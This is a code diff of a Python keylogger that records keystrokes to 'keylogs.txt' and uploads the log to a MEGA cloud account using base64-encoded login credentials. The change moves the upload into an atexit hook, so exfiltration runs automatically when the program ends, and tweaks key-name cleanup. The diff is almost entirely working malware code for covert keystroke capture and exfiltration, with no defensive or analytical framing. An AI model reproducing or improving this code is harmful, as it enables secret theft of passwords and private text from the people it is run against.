@@ -7,10 +7,16 @@ import os
 
 mail = '<YOUR-MAIL-IN-BASE64>'
 passwd_enc = '<YOUR-PASSWORD-IN-BASE64>'
-mega = Mega()
 
 log_dir = ""
 
+def upload_mega():
+    mega = Mega()
+    m = mega.login(base64.b64decode(mail).decode('utf-8'), base64.b64decode(passwd_enc).decode('utf-8'))
+    filename = "keylogs.txt"
+    m.upload(filename)
+
+atexit.register(upload_mega)
 
 logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
 	level=logging.DEBUG, format='%(message)s')
@@ -29,9 +35,6 @@ def on_release(key):
             f.read()
             f.seek(-8, os.SEEK_END)
             f.truncate()
-	m = mega.login(base64.b64decode(mail).decode('utf-8'), base64.b64decode(passwd_enc).decode('utf-8'))
-	filename = "keylogs.txt"
-	m.upload(filename)
         return False
 
 with Listener(on_press=on_press,on_release=on_release) as listener:
@@ -45,4 +48,6 @@ with open('keylogs.txt', 'w') as f:
         line=line.replace("Key.space"," ")
         line=line.replace("Key.enter","\n---Enter---\n")
         line=line.replace("'","")
+        line=line.replace("Key.shift_r","")
         f.write(line)
+    f.write("\n\n")
